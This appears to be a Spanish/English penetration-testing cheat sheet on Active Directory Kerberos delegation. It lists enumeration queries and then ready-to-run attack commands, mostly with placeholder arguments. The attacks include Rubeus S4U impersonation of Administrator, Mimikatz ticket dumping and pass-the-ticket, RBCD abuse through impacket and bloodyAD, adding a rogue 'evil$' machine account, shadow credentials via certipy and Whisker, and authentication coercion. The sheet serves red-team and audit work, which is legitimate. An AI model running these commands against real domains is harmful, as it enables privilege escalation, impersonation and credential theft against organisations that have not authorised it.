---
aliases:
  - Delegation Tooling
  - PowerView Delegation
  - certipy shadow
  - Rubeus s4u
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
  - "[[netexec]]"
  - "[[Impacket Toolkit]]"
---
# AD - Delegation Enumeration - Tooling

***

## netexec / crackmapexec

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc ldap <DC> -u u -p p --trusted-for-delegation` | UD users + computers | Quick UD. |
| `nxc ldap <DC> -u u -p p --query "(msDS-AllowedToDelegateTo=*)" "samAccountName,msDS-AllowedToDelegateTo,userAccountControl"` | CD inventory | Custom. |
| `nxc ldap <DC> -u u -p p --query "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" "samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity"` | RBCD configured | Custom. |
| `nxc ldap <DC> -u u -p p --query "(msDS-KeyCredentialLink=*)" "samAccountName"` | Shadow Cred set | Audit. |
^ad-deleg-tool-netexec

___

## RSAT / PowerShell

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` | UD computers | Standard. |
| `Get-ADUser -Filter {TrustedForDelegation -eq $true}` | UD users (rare) | Audit. |
| `Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Pr msDS-AllowedToDelegateTo,userAccountControl` | CD inventory (users + computers) | Standard. |
| `Get-ADComputer -Filter * -Pr msDS-AllowedToActOnBehalfOfOtherIdentity \| ? msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD configurado | Standard. |
| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Shadow Cred audit | Standard. |
| `Set-ADAccountControl -Identity <user> -AccountNotDelegated $true` | Hardening | Tier 0. |
| `Set-ADComputer <target> -PrincipalsAllowedToDelegateToAccount <attacker-computer>` | Set RBCD (priv) | Privesc setup. |
^ad-deleg-tool-rsat

___

## PowerView (Adversary)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-DomainComputer -Unconstrained` | UD computers | Quick. |
| `Get-DomainUser -Unconstrained` | UD users (rare) | Audit. |
| `Get-DomainComputer -TrustedToAuth` | CD computers | Standard. |
| `Get-DomainUser -TrustedToAuth` | CD users | Standard. |
| `Get-DomainObject -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"` | RBCD config | Standard. |
| `Get-DomainObject -LDAPFilter "(msDS-KeyCredentialLink=*)"` | Shadow Cred set | Audit. |
| `Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <atacante> -Rights All` | Add ACE for delegation setup | Privesc. |
^ad-deleg-tool-powerview

___

## BloodHound / SharpHound

| **Comando / Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SharpHound.exe -c All` | Includes delegation edges | Standard. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux | Linux. |
| `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name` | UD inventory | Standard. |
| `MATCH (u)-[:AllowedToDelegate]->(c) RETURN u,c` | CD edges | Standard. |
| `MATCH (u)-[:AllowedToAct]->(c) RETURN u,c` | RBCD edges | Standard. |
| `MATCH (u)-[:AddKeyCredentialLink]->(t) RETURN u,t` | Shadow Cred edges | Standard. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) WHERE any(r IN relationships(p) WHERE type(r) IN ["AllowedToDelegate","AllowedToAct","AddKeyCredentialLink"]) RETURN p` | Privesc paths via delegation | Path planning. |
^ad-deleg-tool-bh

___

## ldapsearch / Linux

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch ... "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn` | UD computers raw | Linux. |
| `ldapsearch ... "(msDS-AllowedToDelegateTo=*)" samAccountName msDS-AllowedToDelegateTo userAccountControl` | CD raw | Linux. |
| `ldapsearch ... "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" samAccountName` | RBCD raw | Linux. |
| `ldapsearch ... "(msDS-KeyCredentialLink=*)" samAccountName` | Shadow Cred raw | Linux. |
^ad-deleg-tool-ldapsearch

___

## Delegation Attack Tools

| **Tool** | **Comando** | **Para qué** |
|:---:|:---:|:---:|
| Rubeus (Windows) | `Rubeus.exe s4u /user:svc /rc4:<NT> /impersonateuser:Administrator /msdsspn:cifs/<target> /ptt` | S4U2Self/S4U2Proxy + PtT. |
| Rubeus monitor | `Rubeus.exe monitor /interval:5 /targetuser:DC01$` | Live TGT capture (UD). |
| Rubeus asktgt PKINIT | `Rubeus.exe asktgt /user:victim /certificate:<base64-PFX> /password:<pwd> /ptt` | Shadow Cred auth. |
| `impacket-getST` (Linux) | `impacket-getST -spn <SPN> -impersonate Administrator -dc-ip <DC> 'corp.local/svc:pass'` | S4U Linux. |
| `impacket-rbcd` | `impacket-rbcd -delegate-to <target> -delegate-from <atacante> -action write -dc-ip <DC> 'corp.local/u:p'` | RBCD set/read/remove. |
| `impacket-addcomputer` | `impacket-addcomputer -computer-name 'evil$' -computer-pass 'EvilPass!' 'corp.local/u:p'` | MAQ abuse pre-RBCD. |
| `certipy shadow` | `certipy shadow auto -u u -p pass -account victim -dc-ip <DC>` | Shadow Cred Linux auto. |
| `certipy auth` | `certipy auth -pfx victim.pfx -dc-ip <DC>` | PKINIT auth post-Shadow Cred. |
| `Whisker.exe add /target:victim` | Shadow Cred Windows | Native Windows. |
| Mimikatz `sekurlsa::tickets /export` | Dump cached TGTs (UD post-coercion) | TGT capture. |
| Mimikatz `kerberos::ptt <ticket.kirbi>` | PtT injection | Use captured TGT. |
| `PetitPotam.py / Coercer.py / dfscoerce.py` | Auth coercion para UD chain | Coercion. |
^ad-deleg-tool-attack

___

## bloodyAD

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `bloodyAD --host <DC> -d corp -u u -p pass add rbcd <target> <atacante>` | Set RBCD Linux | Privesc. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove rbcd <target> <atacante>` | Remove RBCD | Cleanup. |
| `bloodyAD --host <DC> -d corp -u u -p pass add shadowCredentials <victim>` | Add Shadow Cred | Privesc. |
| `bloodyAD --host <DC> -d corp -u u -p pass remove shadowCredentials <victim>` | Remove Shadow Cred | Cleanup. |
| `bloodyAD --host <DC> -d corp -u u -p pass set uac <user> -f TRUSTED_FOR_DELEGATION` | Set UD flag (priv) | Privesc setup. |
^ad-deleg-tool-bloodyad

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| harmj0y — Delegation series | `https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a` |
| Elad Shamir — Wagging the Dog (RBCD) | `https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html` |
| Dirk-jan Mollema — Shadow Credentials | `https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/` |
| Whisker (Shadow Cred) | `https://github.com/eladshamir/Whisker` |
| certipy | `https://github.com/ly4k/Certipy` |
| Rubeus | `https://github.com/GhostPack/Rubeus` |
| Impacket | `https://github.com/fortra/impacket` |
| bloodyAD | `https://github.com/CravateRouge/bloodyAD` |
| HackTricks Delegation | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-delegation` |
| The Hacker Recipes — Delegations | `https://www.thehacker.recipes/ad/movement/kerberos/delegations` |
^ad-deleg-tool-resources

***
